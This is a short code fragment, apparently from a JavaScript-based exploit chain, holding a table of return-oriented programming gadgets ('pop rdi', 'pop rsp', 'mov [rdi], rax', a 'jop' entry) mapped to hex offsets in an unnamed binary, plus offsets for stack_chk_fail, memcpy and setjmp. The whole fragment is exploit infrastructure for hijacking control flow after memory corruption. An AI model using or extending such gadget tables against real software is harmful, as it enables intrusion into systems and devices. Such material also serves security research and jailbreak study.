...
gadgets = {
  ...
  "ep":                     0x000000AD,
  "pop rbp":                0x000000B6,
  "mov [rdi], rax":         0x0014536b,
  "pop r8":                 0x000179c5,
  "pop rax":                0x000043f5,
  "mov rax, rdi":           0x000058d0,
  "mov rax, [rax]":         0x0006c83a,
  "mov rdi, rax; jmp rcx":  0x0119a79a,
  "pop rsi":                0x0008f38a,
  "pop rdi":                0x00038dba,
  "add rsi, rcx; jmp rsi":  0x00a3c7f8,
  "pop rcx":                0x00052e59,
  "pop rsp":                0x0001e687,
  "mov [rdi], rsi":         0x00023ac2,
  "mov [rax], rsi":         0x002565a7,
  "add rsi, rax; jmp rsi":  0x0002e001,
  "pop rdx":                0x000dedc2,
  "pop r9":                 0x00bb30cf,
  "add rax, rcx":           0x00015172,
  "jop":                    0x000c37d0,
  "infloop":                0x012C4009,//Not used

  "stack_chk_fail":         0x000000C8,
  "memcpy":                 0x000000F8,//Not used
  "setjmp":                 0x000014f8
};
